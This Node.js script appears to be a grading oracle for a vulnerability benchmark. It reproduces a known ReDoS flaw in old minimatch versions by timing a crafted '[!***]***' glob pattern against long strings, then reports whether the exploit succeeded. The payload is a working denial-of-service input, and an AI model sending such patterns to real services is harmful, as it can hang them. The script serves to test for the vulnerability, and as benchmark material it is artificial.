'use strict';
const minimatch = require('minimatch');

function main() {
  try {
    // --- Benign operation first: prove basic matching works ---
    const benignPositive = minimatch('index.js', '*.js');
    const benignNegative = minimatch('index.txt', '*.js');

    if (benignPositive !== true || benignNegative !== false) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign minimatch operation did not return expected result.'
      }));
      return;
    }

    const operation_completed = true;

    // --- Malicious input: known minimatch <=3.0.4 ReDoS trigger ---
    // GHSA-f8q6-p94x-37v3: the pattern '[!' + '*'.repeat(n) + ']' +
    // '*'.repeat(n) compiles (on vulnerable versions) into a regex with
    // nested/overlapping quantifiers. Matching it against a long run of
    // a repeated character that never satisfies the trailing anchor
    // forces catastrophic backtracking whose cost grows exponentially
    // with n. We scale n across a short list of increasing sizes, each
    // using a bounded subject length, and measure elapsed time. On the
    // vulnerable version, one of the larger sizes blows past the time
    // threshold; on the patched version all sizes stay fast.
    function buildPattern(n) {
      return '[!' + '*'.repeat(n) + ']' + '*'.repeat(n);
    }
    function buildSubject(n) {
      // No '!' present, and length scales mildly with n so the
      // backtracking work scales too, while staying small enough that
      // even the vulnerable call finishes within a few seconds for the
      // sizes we use here.
      return 'a'.repeat(20 + n);
    }

    const sizes = [10, 20, 28, 32, 34];
    const THRESHOLD_MS = 1500;
    let exploit_succeeded = false;
    let lastElapsed = 0;
    let lastN = 0;
    let lastSubjectLen = 0;
    let lastMatched;
    let threw = false;
    let thrownMessage = '';

    for (const n of sizes) {
      const pattern = buildPattern(n);
      const subject = buildSubject(n);
      const start = Date.now();
      let matched;
      try {
        matched = minimatch(subject, pattern);
      } catch (innerErr) {
        threw = true;
        thrownMessage = String(innerErr && innerErr.message);
        lastElapsed = Date.now() - start;
        lastN = n;
        lastSubjectLen = subject.length;
        break;
      }
      const elapsed = Date.now() - start;
      lastElapsed = elapsed;
      lastN = n;
      lastSubjectLen = subject.length;
      lastMatched = matched;

      if (elapsed >= THRESHOLD_MS) {
        exploit_succeeded = true;
        break;
      }
    }

    if (threw) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'Malicious pattern raised an exception at n=' + lastN + ' after ' + lastElapsed + 'ms: ' + thrownMessage
      }));
      return;
    }

    const evidence = 'Malicious minimatch call (last tested n=' + lastN + ', subjectLen=' + lastSubjectLen +
      ') completed in ' + lastElapsed + 'ms (threshold ' + THRESHOLD_MS + 'ms). Result=' + lastMatched +
      '. exploit_succeeded=' + exploit_succeeded;

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: operation_completed,
      exploit_succeeded: exploit_succeeded,
      evidence: evidence
    }));
  } catch (err) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + String(err && err.message)
    }));
  }
}

main();
